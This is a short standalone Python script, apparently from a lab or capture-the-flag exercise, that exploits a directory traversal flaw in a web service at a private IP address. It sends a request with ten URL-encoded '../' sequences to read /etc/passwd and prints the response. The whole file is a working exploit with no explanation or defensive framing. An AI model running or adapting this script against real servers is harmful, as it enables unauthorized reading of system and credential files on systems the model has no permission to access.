#!/usr/bin/env python3
import requests

url = 'http://192.168.247.16:3000/'
string = '%2e%2e/'

attempt = requests.get(url + (string)* 10 + '/etc/passwd')

print(attempt.text)